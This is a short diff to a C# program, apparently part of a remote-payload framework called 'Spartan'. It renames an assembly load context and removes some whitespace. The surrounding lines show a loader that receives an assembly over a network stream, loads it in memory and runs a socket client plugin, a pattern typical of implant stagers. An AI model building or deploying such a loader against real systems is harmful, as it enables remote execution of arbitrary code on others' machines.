@@ -17,7 +17,7 @@ class Program
         var binaryReader = new BinaryReader(networkStream);
         var binaryWriter = new BinaryWriter(networkStream);
 
-        var payloadLoadContext = new AssemblyLoadContext("");
+        var payloadLoadContext = new AssemblyLoadContext("PayloadLoadContext");
 
         var payloadLength = binaryReader.ReadInt32();
         var payloadBytes = binaryReader.ReadBytes(payloadLength);
@@ -45,7 +45,7 @@ class Program
         var pluginType = payloadAssembly.GetType("Spartan.Payload.SocketClient");
         var pluginInstance = Activator.CreateInstance(pluginType, binaryReader, binaryWriter);
         dynamic plugin = Convert.ChangeType(pluginInstance, pluginType);
-        
+
         while (true)
         {
             var data = Encoding.UTF8.GetString(plugin.ReceiveData());
